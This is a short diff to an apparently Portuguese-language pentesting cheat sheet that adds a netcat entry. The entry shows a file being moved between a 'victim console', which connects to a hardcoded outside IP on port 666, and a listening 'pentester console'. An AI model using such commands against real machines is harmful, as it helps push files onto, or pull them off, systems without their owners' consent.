@@ -10,3 +10,7 @@ MUTT
 ---------------------------------------------------------------------------------
 PYTHON -m http.server 8080
 - Cria um Servidor Basico na Porta Escolhida.
+---------------------------------------------------------------------------------
+NETCAT
+- nc pode ser utilizado para transferir arquivo com o  simbulos (<,>).
+- exemplo nc 52.237.27.64 666 > arquivo - console da vitima || nc -lvp 666 < arquivo - console do pentester.
